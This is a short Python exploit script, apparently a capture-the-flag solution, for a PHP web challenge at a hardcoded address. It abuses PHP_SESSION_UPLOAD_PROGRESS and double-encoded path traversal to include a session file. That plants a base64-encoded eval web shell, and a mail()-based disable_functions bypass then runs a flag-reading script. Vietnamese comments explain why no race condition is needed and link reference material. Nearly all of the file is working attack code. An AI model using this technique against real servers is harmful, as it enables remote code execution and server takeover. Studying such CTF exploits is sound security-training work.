import requests
from urllib.parse import quote

r = requests.Session()
url = 'http://157.245.35.236:32019'


def write_shell(session_name, web_path):
	
	payload = f"<?php file_put_contents('{web_path + '/exploit.php'}',base64_decode('PD9waHAgZXZhbCgkX0dFVFsiY21kIl0pOyA/Pg==')); ?>"
 
	cookies = {'PHPSESSID': session_name}
	data= {'PHP_SESSION_UPLOAD_PROGRESS': payload}
 
	files = {
		'file': 'd47' * 100
	}
	
	print("[+] Post PHP_SESSION_UPLOAD_PROGRESS ")
	r.post(url + '/', cookies=cookies, files=files, data=data)

	print(f"[+] Include session file stored at /tmp/sess_{session_name}")
	r.get(url + '/miner/' + quote(quote(f'../../../tmp/sess_{session_name}', safe='')))

	print(f"[+] Web shell: {url + '/exploit.php?cmd='}")

def get_flag():
    
    
    payload = f"file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');"
    
    flag = r.get(url + f'/exploit.php?cmd={quote(payload)}')
    print("[+] Getting flag")
    print(flag.text)
    
if __name__ == "__main__":
    SESSION_NAME = 'd47sec'
    WEB_PATH = '/www'   
    print("[+] Try to write web shell ")
    write_shell(SESSION_NAME, WEB_PATH)
    get_flag()
    

# https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass


# session.upload_progress.cleanup	Off	Off , do bài này mode này off nên file session vẫn còn lưu lại ko bị xoá đi , nêu không cần phải race condition để đọc file 

# https://github.com/iiSiLvEr/Exploiting-PHP_SESSION_UPLOAD_PRO-GRESS/blob/main/poc.py bài này sử dụng race condition để đọc file  
